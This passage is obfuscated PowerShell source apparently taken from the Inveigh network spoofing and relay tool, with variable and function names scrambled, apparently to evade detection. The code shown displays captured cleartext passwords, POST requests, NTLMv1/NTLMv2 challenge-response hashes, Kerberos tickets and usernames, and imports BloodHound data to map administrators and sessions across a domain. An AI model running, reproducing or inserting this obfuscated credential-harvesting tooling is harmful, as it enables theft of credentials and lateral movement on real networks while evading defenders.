                                Write-Output($wzCNZfgp99.console_queue[0] + $wzCNZfgp99.newline)
                            }
                            else
                            {
                                Write-Output($wzCNZfgp99.console_queue[0])
                            }
                        }
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    } 
                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                    {
                    
                        if($liSaTCmu99 -ne "Low")
                        {
                            if($wzCNZfgp99.output_stream_only)
                            {
                                Write-Output($wzCNZfgp99.console_queue[0] + $wzCNZfgp99.newline)
                            }
                            else
                            {
                                Write-Output($wzCNZfgp99.console_queue[0])
                            }
                        }
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    } 
                    default
                    {
                        if($wzCNZfgp99.output_stream_only)
                        {
                            Write-Output($wzCNZfgp99.console_queue[0] + $wzCNZfgp99.newline)
                        }
                        else
                        {
                            Write-Output($wzCNZfgp99.console_queue[0])
                        }
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    }
                }
            }
            if($TwzNLFBf99 -and $NuflVMGr99.Elapsed -ge $uBzUnpSW99)
            {
            
                if($wzCNZfgp99.cleartext_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $wzCNZfgp99.newline)
                    $wzCNZfgp99.cleartext_list.Sort()
                    $NTAyVNla99 = $wzCNZfgp99.cleartext_list
                    foreach($qEAQDdAu99 in $NTAyVNla99)
                    {
                        if($qEAQDdAu99 -ne $VcadKBOp99)
                        {
                            Write-Output($qEAQDdAu99 + $wzCNZfgp99.newline)
                        }
                        $VcadKBOp99 = $qEAQDdAu99
                    }
                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + $wzCNZfgp99.newline)
                }
                if($wzCNZfgp99.POST_request_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $wzCNZfgp99.newline)
                    $wzCNZfgp99.POST_request_list.Sort()
                    $SUaWUyFP99 = $wzCNZfgp99.POST_request_list
                    foreach($UnMolsHi99 in $SUaWUyFP99)
                    {
                        if($UnMolsHi99 -ne $MhNJoVrF99)
                        {
                            Write-Output($UnMolsHi99 + $wzCNZfgp99.newline)
                        }
                        $MhNJoVrF99 = $UnMolsHi99
                    }
                    Start-Sleep -m 5
                }
            
                if($wzCNZfgp99.NTLMv1_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $wzCNZfgp99.newline)
                    $wzCNZfgp99.NTLMv1_list.Sort()
                    $hQJMUfJy99 = $wzCNZfgp99.NTLMv1_list
                    foreach($dsixgaNM99 in $hQJMUfJy99)
                    {
                        $OqPLqMSf99 = $dsixgaNM99.SubString(0,$dsixgaNM99.IndexOf(":",($dsixgaNM99.IndexOf(":") + 2)))
                        if($OqPLqMSf99 -ne $nQZCgzFN99)
                        {
                            Write-Output($dsixgaNM99 + $wzCNZfgp99.newline)
                        }
                        $nQZCgzFN99 = $OqPLqMSf99
                    }
                    $nQZCgzFN99 = ''
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $wzCNZfgp99.newline)
                    $OFKTAjmN99 = $wzCNZfgp99.NTLMv1_username_list
                    foreach($uqYCvSEo99 in $OFKTAjmN99)
                    {
                        Write-Output($uqYCvSEo99 + $wzCNZfgp99.newline)
                    }
                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + $wzCNZfgp99.newline)
                }
                if($wzCNZfgp99.NTLMv2_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $wzCNZfgp99.newline)
                    $wzCNZfgp99.NTLMv2_list.Sort()
                    $BsDQxTxW99 = $wzCNZfgp99.NTLMv2_list
                    foreach($DroMzpXP99 in $BsDQxTxW99)
                    {
                        $zlCFIdmj99 = $DroMzpXP99.SubString(0,$DroMzpXP99.IndexOf(":",($DroMzpXP99.IndexOf(":") + 2)))
                        if($zlCFIdmj99 -ne $YSNmEMAz99)
                        {
                            Write-Output($DroMzpXP99 + $wzCNZfgp99.newline)
                        }
                        $YSNmEMAz99 = $zlCFIdmj99
                    }
                    $YSNmEMAz99 = ''
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $wzCNZfgp99.newline)
                    $uRarLmYA99 = $wzCNZfgp99.NTLMv2_username_list
                    foreach($sYDusjUr99 in $uRarLmYA99)
                    {
                        Write-Output($sYDusjUr99 + $wzCNZfgp99.newline)
                    }
                
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + $wzCNZfgp99.newline)
                }
                $NuflVMGr99 = [System.Diagnostics.Stopwatch]::StartNew()
            }
            if($wzCNZfgp99.console_input)
            {
                if([Console]::KeyAvailable)
                {
                    $wzCNZfgp99.console_output = $false
                    BREAK console_loop
                }
        
            }
            Start-Sleep -m 5
        }
    }
}
finally
{
    if($Tool -eq 2)
    {
        $wzCNZfgp99.running = $false
    }
}
}
function selenium
{
    if($wzCNZfgp99)
    {
        $wzCNZfgp99.stop = $true
        
        if($wzCNZfgp99.running -or $wzCNZfgp99.relay_running)
        {
            $wzCNZfgp99.console_queue.Clear()
            Alisha -wJAgOUDU99
        }
        else
        {
            Write-Output "[-] There are no running Inveigh functions"
        }
    }
}
function chant
{
    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][Switch]$DvPxUzVp99,
        [parameter(Mandatory=$false)][Switch]$SifgTQZi99,
        [parameter(Mandatory=$false)][Switch]$jSeasJaF99,
        [parameter(Mandatory=$false)][Switch]$watihopW99,
        [parameter(Mandatory=$false)][Switch]$LquHfAoP99,
        [parameter(Mandatory=$false)][Int]$GnQFKoiC99,
        [parameter(Mandatory=$false)][Switch]$xMxnJmAu99,
        [parameter(Mandatory=$false)][Switch]$cnVuCRau99,
        [parameter(Mandatory=$false)][Switch]$Log,
        [parameter(Mandatory=$false)][Switch]$afxroQJr99,
        [parameter(Mandatory=$false)][Switch]$lYMmXTYH99,
        [parameter(Mandatory=$false)][Switch]$YdsPlwoM99,
        [parameter(Mandatory=$false)][Switch]$zAKOIDvA99,
        [parameter(Mandatory=$false)][Switch]$FMmJZHuQ99,
        [parameter(Mandatory=$false)][Switch]$eFtJJMvY99,
        [parameter(Mandatory=$false)][Switch]$TWTDwVBA99,
        [parameter(Mandatory=$false)][Switch]$NynsCGvF99,
        [parameter(Mandatory=$false)][Switch]$lnnWyXyw99,
        [parameter(Mandatory=$false)][Switch]$xTXUALnq99,
        [parameter(ValueFromRemainingArguments=$true)]$ovkaYEik99
    )
    if($jSeasJaF99 -or $PSBoundParameters.Count -eq 0)
    {
        while($wzCNZfgp99.console_queue.Count -gt 0)
        {
            if($wzCNZfgp99.output_stream_only)
            {
                Write-Output($wzCNZfgp99.console_queue[0] + $wzCNZfgp99.newline)
                $wzCNZfgp99.console_queue.RemoveAt(0)
            }
            else
            {
                switch -wildcard ($wzCNZfgp99.console_queue[0])
                {
                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $wzCNZfgp99.console_queue[0]
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    }
                    default
                    {
                        Write-Output $wzCNZfgp99.console_queue[0]
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    }
                }
            }
            
        }
    }
    if($watihopW99)
    {
        $RzwlAByt99 = $wzCNZfgp99.ADIDNS_table.Keys
        foreach($EVzMAFnn99 in $RzwlAByt99)
        {
            
            if($wzCNZfgp99.ADIDNS_table.$EVzMAFnn99 -ge 1)
            {
                Write-Output $EVzMAFnn99
            }
        }
    }
    if($LquHfAoP99)
    {
        $RzwlAByt99 = $wzCNZfgp99.ADIDNS_table.Keys
        foreach($EVzMAFnn99 in $RzwlAByt99)
        {
            
            if($wzCNZfgp99.ADIDNS_table.$EVzMAFnn99 -eq 0)
            {
                Write-Output $EVzMAFnn99
            }
        }
    }
    if($GnQFKoiC99)
    {
        Write-Output $wzCNZfgp99.kerberos_TGT_list[$GnQFKoiC99]
    }
    if($xMxnJmAu99)
    {
        Write-Output $wzCNZfgp99.kerberos_TGT_username_list
    }
    if($Log)
    {
        Write-Output $wzCNZfgp99.log
    }
    if($afxroQJr99)
    {
        Write-Output $wzCNZfgp99.NTLMv1_list
    }
    if($YdsPlwoM99)
    {
        $wzCNZfgp99.NTLMv1_list.Sort()
        $hQJMUfJy99 = $wzCNZfgp99.NTLMv1_list
        foreach($dsixgaNM99 in $hQJMUfJy99)
        {
            $OqPLqMSf99 = $dsixgaNM99.SubString(0,$dsixgaNM99.IndexOf(":",($dsixgaNM99.IndexOf(":") + 2)))
            if($OqPLqMSf99 -ne $nQZCgzFN99)
            {
                Write-Output $dsixgaNM99
            }
            $nQZCgzFN99 = $OqPLqMSf99
        }
    }
    if($FMmJZHuQ99)
    {
        Write-Output $wzCNZfgp99.NTLMv2_username_list
    }
    if($lYMmXTYH99)
    {
        Write-Output $wzCNZfgp99.NTLMv2_list
    }
    if($zAKOIDvA99)
    {
        $wzCNZfgp99.NTLMv2_list.Sort()
        $BsDQxTxW99 = $wzCNZfgp99.NTLMv2_list
        foreach($DroMzpXP99 in $BsDQxTxW99)
        {
            $zlCFIdmj99 = $DroMzpXP99.SubString(0,$DroMzpXP99.IndexOf(":",($DroMzpXP99.IndexOf(":") + 2)))
            if($zlCFIdmj99 -ne $YSNmEMAz99)
            {
                Write-Output $DroMzpXP99
            }
            $YSNmEMAz99 = $zlCFIdmj99
        }
    }
    if($eFtJJMvY99)
    {
        Write-Output $wzCNZfgp99.NTLMv2_username_list
    }
    if($DvPxUzVp99)
    {
        Write-Output $wzCNZfgp99.cleartext_list
    }
    if($SifgTQZi99)
    {
        Write-Output $wzCNZfgp99.cleartext_list | Get-Unique
    }
    if($TWTDwVBA99)
    {
        Write-Output $wzCNZfgp99.POST_request_list
    }
    if($NynsCGvF99)
    {
        Write-Output $wzCNZfgp99.POST_request_list | Get-Unique
    }
    if($cnVuCRau99)
    {
        Write-Output $wzCNZfgp99.valid_host_list
    }
    if($lnnWyXyw99)
    {
        $i = 0
        while($i -lt $wzCNZfgp99.session_socket_table.Count)
        {
            if(!$wzCNZfgp99.session_socket_table[$i].Connected)
            {
                $wzCNZfgp99.session[$i] | Where-Object {$_.Status = "disconnected"}
            }
        
            $i++
        }
        Write-Output $wzCNZfgp99.session | Format-Table -AutoSize
    }
    if($xTXUALnq99)
    {
        Write-Output $wzCNZfgp99.enumerate
    }
}
function Alisha
{
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]$wJAgOUDU99,
    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$liSaTCmu99 = "Y",
    [parameter(ValueFromRemainingArguments=$true)]$ovkaYEik99
)
if($wzCNZfgp99.tool -ne 1)
{
    if($wzCNZfgp99.running -or $wzCNZfgp99.relay_running)
    {
        
        if(!$wJAgOUDU99)
        {
            Write-Output "[*] Press any key to stop console output"
        }
        $wzCNZfgp99.console_output = $true
        :console_loop while((($wzCNZfgp99.running -or $wzCNZfgp99.relay_running) -and $wzCNZfgp99.console_output) -or ($wzCNZfgp99.console_queue.Count -gt 0 -and $wzCNZfgp99.console_output))
        {
            while($wzCNZfgp99.console_queue.Count -gt 0)
            {
                switch -wildcard ($wzCNZfgp99.console_queue[0])
                {
                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $wzCNZfgp99.console_queue[0]
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    }
                    {$_ -like "*spoofer disabled]" -or $_ -like "*local request]" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {
                        if($liSaTCmu99 -eq 'Y')
                        {
                            Write-Output $wzCNZfgp99.console_queue[0]
                        }
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    } 
                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                    {
                    
                        if($liSaTCmu99 -ne "Low")
                        {
                            Write-Output $wzCNZfgp99.console_queue[0]
                        }
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    } 
                    default
                    {
                        Write-Output $wzCNZfgp99.console_queue[0]
                        $wzCNZfgp99.console_queue.RemoveAt(0)
                    }
                } 
            }
            if([Console]::KeyAvailable)
            {
                $wzCNZfgp99.console_output = $false
                BREAK console_loop
            }
            Start-Sleep -m 5
        }
    }
    else
    {
        Write-Output "[-] Inveigh isn't running"
    }
}
else
{
    Write-Output "[-] Alisha cannot be used with current external tool selection"
}
}
function aces
{
if($wzCNZfgp99)
{
    if(!$wzCNZfgp99.running -and !$wzCNZfgp99.relay_running)
    {
        Remove-Variable inveigh -scope global
        Write-Output "[+] Inveigh data has been cleared from memory"
    }
    else
    {
        Write-Output "[-] Run selenium before running aces"
    }
}
}
function fluid
{
    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$rJDbfvlL99,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$gKppUFfP99,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$lLSDCTiS99,
        [parameter(Mandatory=$false)][Switch]$DNS,
        [parameter(ValueFromRemainingArguments=$true)]$ovkaYEik99
    )
    if(!$rJDbfvlL99 -and !$gKppUFfP99 -and !$lLSDCTiS99)
    {
        Write-Output "Specifiy a BloodHound computers, groups, or sessions JSON file"
        throw
    }
    if($wzCNZfgp99.running -or $wzCNZfgp99.relay_running)
    {
        Write-Output "Run selenium before importing data with fluid"
        throw
    }
    if(!$wzCNZfgp99)
    {
        $dAkSnGeo99:inveigh = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.cleartext_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.enumerate = New-Object System.Collections.ArrayList
        $wzCNZfgp99.IP_capture_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.log = New-Object System.Collections.ArrayList
        $wzCNZfgp99.kerberos_TGT_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.NTLMv1_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.NTLMv1_username_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.NTLMv2_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.NTLMv2_username_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.POST_request_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.valid_host_list = New-Object System.Collections.ArrayList
        $wzCNZfgp99.ADIDNS_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.relay_privilege_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.relay_failed_login_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.relay_history_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.request_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.session_socket_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.session_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.session_message_ID_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.session_lock_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.SMB_session_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.domain_mapping_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.group_table = [HashTable]::Synchronized(@{})
        $wzCNZfgp99.session_count = 0
        $wzCNZfgp99.session = @()
    }
    function certifies
    {
        param ($IP,$gcdpCjEe99,$uZmPrDmi99,$OamadspL99,$gKppUFfP99,$pwivefkX99,$oiJLwjsK99,
            $xVEYaeme99,$WisOMRvt99,$ShkfcLqf99,$vwKqKrSr99,$FPPyxYsi99,$SMB2,$gTPBKjHD99,$WwDuwDjP99,$qTXAuQbl99,
            $nTEAnXCx99,$vGmgWIcS99,$xTXUALnq99,$qnWvVent99)
        if($gKppUFfP99 -and $gKppUFfP99 -isnot [Array]){$gKppUFfP99 = @($gKppUFfP99)}
        if($pwivefkX99 -and $pwivefkX99 -isnot [Array]){$pwivefkX99 = @($pwivefkX99)}
        if($oiJLwjsK99 -and $oiJLwjsK99 -isnot [Array]){$oiJLwjsK99 = @($oiJLwjsK99)}
        if($xVEYaeme99 -and $xVEYaeme99 -isnot [Array]){$xVEYaeme99 = @($xVEYaeme99)}
        if($WisOMRvt99 -and $WisOMRvt99 -isnot [Array]){$WisOMRvt99 = @($WisOMRvt99)}
        if($ShkfcLqf99 -and $ShkfcLqf99 -isnot [Array]){$ShkfcLqf99 = @($ShkfcLqf99)}
        if($vwKqKrSr99 -and $vwKqKrSr99 -isnot [Array]){$vwKqKrSr99 = @($vwKqKrSr99)}
        if($FPPyxYsi99 -and $FPPyxYsi99 -isnot [Array]){$FPPyxYsi99 = @($FPPyxYsi99)}
        $DqTzYdTZ99 = New-Object PSObject
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Index" $wzCNZfgp99.enumerate.Count
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "IP" $IP
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Hostname" $gcdpCjEe99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "DNS Domain" $uZmPrDmi99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "netBIOS Domain" $OamadspL99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Sessions" $gKppUFfP99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Administrator Users" $pwivefkX99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Administrator Groups" $oiJLwjsK99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Privileged" $xVEYaeme99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Shares" $WisOMRvt99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "NetSessions" $ShkfcLqf99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "NetSessions Mapped" $vwKqKrSr99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Local Users" $FPPyxYsi99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "SMB2.1" $SMB2
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Signing" $gTPBKjHD99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "SMB Server" $WwDuwDjP99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "DNS Record" $qTXAuQbl99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "IPv6 Only" $nTEAnXCx99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Targeted" $vGmgWIcS99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Enumerate" $xTXUALnq99
        Add-Member -InputObject $DqTzYdTZ99 -MemberType NoteProperty -Name "Execute" $qnWvVent99
        
        return $DqTzYdTZ99
    }
    function Get-DNSEntry([String]$gcdpCjEe99)
    {
        try
        {
            $BTUWZakB99 = [System.Net.Dns]::GetHostEntry($gcdpCjEe99)
            foreach($entry in $BTUWZakB99.AddressList)
            {
                if(!$entry.IsIPv6LinkLocal)
                {
                    $IP = $entry.IPAddressToString
                }
            }
                    
        }
        catch
        {
            $IP = $null
        }
        return $IP
    }
    function Invoke-ParseItem($PtORmAdk99) 
    {
        if($PtORmAdk99.PSObject.TypeNames -match 'Array') 
        {
            return Invoke-ParseJsonArray($PtORmAdk99)
        }
        elseif($PtORmAdk99.PSObject.TypeNames -match 'Dictionary') 
        {
            return Invoke-ParseJsonObject([HashTable]$PtORmAdk99)
        }
        else 
        {
            return $PtORmAdk99
        }
    }
    function Invoke-ParseJsonObject($JdJAxzMJ99) 
    {
        $RrtfXpVa99 = New-Object -TypeName PSCustomObject
        foreach($key in $JdJAxzMJ99.Keys) 
        {
            $item = $JdJAxzMJ99[$key]
            if ($item) 
            {
                $NRkaRsyL99 = Invoke-ParseItem $item
            }
            else 
            {
                $NRkaRsyL99 = $null
            }
            $RrtfXpVa99 | Add-Member -MemberType NoteProperty -Name $key -Value $NRkaRsyL99
        }
        return $RrtfXpVa99
    }
    function Invoke-ParseJSONArray($WlaYRdNq99) 
    {
        $RrtfXpVa99 = @()
        $uNrRBPBK99 = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
        $WlaYRdNq99 | ForEach-Object -Process {
            if($uNrRBPBK99.Elapsed.TotalMilliseconds -ge 500)
            {
                $vmVBJldx99 = [Math]::Truncate($i / $WlaYRdNq99.count * 100)
                if($vmVBJldx99 -le 100)
                {
                    Write-Progress -Activity "Parsing JSON" -Status "$vmVBJldx99% Complete:" -PercentComplete $vmVBJldx99 -ErrorAction SilentlyContinue
                }
                $uNrRBPBK99.Reset()
                $uNrRBPBK99.Start()
            }
            $i++
            $RrtfXpVa99 += , (Invoke-ParseItem $_)}
        return $RrtfXpVa99
    }
    function Invoke-ParseJSONString($json) 
    {
        $tMTUKOuX99 = $fFGHQoVJ99.DeserializeObject($json)
        return Invoke-ParseJsonObject $tMTUKOuX99
    }
    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")
    if($wzCNZfgp99.enumerate.Count -eq 0)
    {
        $GOWvTSGR99 = $true
    }
    if($rJDbfvlL99)
    {       
        $rJDbfvlL99 = (Resolve-Path $rJDbfvlL99).Path
        $ZDSyOGDe99 = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $ZDSyOGDe99.MaxJsonLength = 104857600
        $teDDCzOi99 = [System.IO.File]::ReadAllText($rJDbfvlL99)
        $teDDCzOi99 = $ZDSyOGDe99.DeserializeObject($teDDCzOi99)
        Write-Output "[*] Parsing BloodHound Computers JSON"
        $huCVFLkG99 = [System.Diagnostics.Stopwatch]::StartNew()
        $teDDCzOi99 = Invoke-ParseItem $teDDCzOi99
        Write-Output "[+] Parsing completed in $([Math]::Truncate($huCVFLkG99.Elapsed.TotalSeconds)) seconds"
        $huCVFLkG99.Reset()
        $huCVFLkG99.Start()
        Write-Output "[*] Importing computers to Inveigh"
        $uNrRBPBK99 = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
        if(!$teDDCzOi99.Computers)
        {
            Write-Output "[!] JSON computers parse failed"
            throw
        }
        $teDDCzOi99.Computers | ForEach-Object {
            if($uNrRBPBK99.Elapsed.TotalMilliseconds -ge 500)
            {
                $vmVBJldx99 = [Math]::Truncate($i / $teDDCzOi99.Computers.Count * 100)
                if($vmVBJldx99 -le 100)
                {
                    Write-Progress -Activity "[*] Importing computers" -Status "$vmVBJldx99% Complete:" -PercentComplete $vmVBJldx99 -ErrorAction SilentlyContinue
                }
                $uNrRBPBK99.Reset()
                $uNrRBPBK99.Start()
            }
            $gcdpCjEe99 = $_.Name
            [Array]$LglLusQT99 = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name
            [Array]$ystRBPAf99 = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name
            if($DNS)
            {
                $IP = Get-DNSEntry $gcdpCjEe99
                if(!$IP)
                {
                    Write-Output "[-] DNS lookup for $gcdpCjEe99 failed"
                }
            }
            if(!$GOWvTSGR99)
            {
                for($i = 0;$i -lt $wzCNZfgp99.enumerate.Count;$i++)
                {
                    if(($gcdpCjEe99 -and $wzCNZfgp99.enumerate[$i].Hostname -eq $gcdpCjEe99) -or ($IP -and $wzCNZfgp99.enumerate[$i].IP -eq $IP))
                    {
                        if($wzCNZfgp99.enumerate[$i].Hostname -ne $gcdpCjEe99 -and $wzCNZfgp99.enumerate[$i].IP -eq $IP)
                        {
                            for($j = 0;$j -lt $wzCNZfgp99.enumerate.Count;$j++)
                            {
                                if($wzCNZfgp99.enumerate[$j].IP -eq $YzPoRbVp99)
                                {
                                    $CrbNztYx99 = $j
                                    break
                                }
                            }
                            $wzCNZfgp99.enumerate[$CrbNztYx99].Hostname = $gcdpCjEe99
                        }
                        else
                        {
                            for($j = 0;$j -lt $wzCNZfgp99.enumerate.Count;$j++)
                            {
                                if($wzCNZfgp99.enumerate[$j].Hostname -eq $gcdpCjEe99)
                                {
                                    $CrbNztYx99 = $j
                                    break
                                }
                            }
                        }
                        $wzCNZfgp99.enumerate[$CrbNztYx99]."Administrator Users" = $LglLusQT99
                        $wzCNZfgp99.enumerate[$CrbNztYx99]."Administrator Groups" = $ystRBPAf99
                    }
                    else
                    {
                        $wzCNZfgp99.enumerate.Add((certifies -gcdpCjEe99 $_.Name -IP $IP -pwivefkX99 $LglLusQT99 -oiJLwjsK99 $ystRBPAf99)) > $null
                    }
                }
            }
            else
            {
                $wzCNZfgp99.enumerate.Add((certifies -gcdpCjEe99 $_.Name -IP $IP -pwivefkX99 $LglLusQT99 -oiJLwjsK99 $ystRBPAf99)) > $null
            }
            $IP = $null
            $gcdpCjEe99 = $null
            $LglLusQT99 = $null
            $ystRBPAf99 = $null
            $CrbNztYx99 = $null
            $i++
        }
        Write-Output "[+] Import completed in $([Math]::Truncate($huCVFLkG99.Elapsed.TotalSeconds)) seconds"
        $huCVFLkG99.Reset()
        Remove-Variable bloodhound_computers
    }
    if($gKppUFfP99)
    {
        $gKppUFfP99 = (Resolve-Path $gKppUFfP99).Path
        $mKbMumPn99 = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $mKbMumPn99.MaxJsonLength = 104857600
        $gtiWjspz99 = [System.IO.File]::ReadAllText($gKppUFfP99)
        $gtiWjspz99 = $mKbMumPn99.DeserializeObject($gtiWjspz99)
        $huCVFLkG99 = [System.Diagnostics.Stopwatch]::StartNew()
        Write-Output "[*] Parsing BloodHound Sessions JSON"
        $gtiWjspz99 = Invoke-ParseItem $gtiWjspz99
        Write-Output "[+] Parsing completed in $([Math]::Truncate($huCVFLkG99.Elapsed.TotalSeconds)) seconds"
        $huCVFLkG99.Reset()
        $huCVFLkG99.Start()
        Write-Output "[*] Importing sessions to Inveigh"
        $uNrRBPBK99 = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0
        if(!$gtiWjspz99.Sessions)
        {
            Write-Output "[!] JSON sessions parse failed"
            throw
        }
        $gtiWjspz99.Sessions | ForEach-Object {
            
            if($uNrRBPBK99.Elapsed.TotalMilliseconds -ge 500)
            {
                $vmVBJldx99 = [Math]::Truncate($i / $gtiWjspz99.Sessions.Count * 100)
                if($vmVBJldx99 -le 100)
                {
                    Write-Progress -Activity "[*] Importing sessions" -Status "$vmVBJldx99% Complete:" -PercentComplete $vmVBJldx99 -ErrorAction SilentlyContinue
                }
                $uNrRBPBK99.Reset()
                $uNrRBPBK99.Start()
            }
            $gcdpCjEe99 = $_.ComputerName
            if($gcdpCjEe99 -as [IPAddress] -as [Bool])
            {
                $IP = $gcdpCjEe99
                $gcdpCjEe99 = $null
                for($i = 0;$i -lt $wzCNZfgp99.enumerate.Count;$i++)
                {
                    if($wzCNZfgp99.enumerate[$i].IP -eq $YzPoRbVp99)
                    {
                        $CrbNztYx99 = $i
                        break
                    }
                }
            }
            else
            {
                for($i = 0;$i -lt $wzCNZfgp99.enumerate.Count;$i++)
                {
                    if($wzCNZfgp99.enumerate[$i].Hostname -eq $gcdpCjEe99)
                    {
                        $CrbNztYx99 = $i
                        break
                    }
                }
                if($DNS)
                {
                    $IP = Get-DNSEntry $gcdpCjEe99
                    if(!$IP)
                    {
                        Write-Output "[-] DNS lookup for $gcdpCjEe99 failed or IPv6 address"
                    }
                }
            }
            if(!$GOWvTSGR99 -or $CrbNztYx99 -ge 0)
            {
                [Array]$mRBiDkXA99 = $wzCNZfgp99.enumerate[$CrbNztYx99].Sessions
                if($mRBiDkXA99 -notcontains $_.UserName)
                {
                    $mRBiDkXA99 += $_.UserName
                    $wzCNZfgp99.enumerate[$CrbNztYx99].Sessions = $mRBiDkXA99
                }
            }
            else
            {   
                $wzCNZfgp99.enumerate.Add($(certifies -gcdpCjEe99 $gcdpCjEe99 -IP $IP -gKppUFfP99 $_.UserName)) > $null
            }
            $gcdpCjEe99 = $null
            $IP = $null
            $mRBiDkXA99 = $null
            $CrbNztYx99 = $null
            $i++
        }
        Write-Output "[+] Import completed in $([Math]::Truncate($huCVFLkG99.Elapsed.TotalSeconds)) seconds"
        $huCVFLkG99.Reset()
        Remove-Variable bloodhound_sessions
    }
    
    if($lLSDCTiS99)
    {
        $lLSDCTiS99 = (Resolve-Path $lLSDCTiS99).Path
        $kWoTfqHh99 = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $kWoTfqHh99.MaxJsonLength = 104857600
        $KwYylwZk99 = [System.IO.File]::ReadAllText($lLSDCTiS99)
        $KwYylwZk99 = $kWoTfqHh99.DeserializeObject($KwYylwZk99)
        $huCVFLkG99 = [System.Diagnostics.Stopwatch]::StartNew()
        Write-Output "[*] Parsing BloodHound Groups JSON"
        $KwYylwZk99 = Invoke-ParseItem $KwYylwZk99
        Write-Output "[+] Parsing completed in $([Math]::Truncate($huCVFLkG99.Elapsed.TotalSeconds)) seconds"
        $huCVFLkG99.Reset()
        $huCVFLkG99.Start()
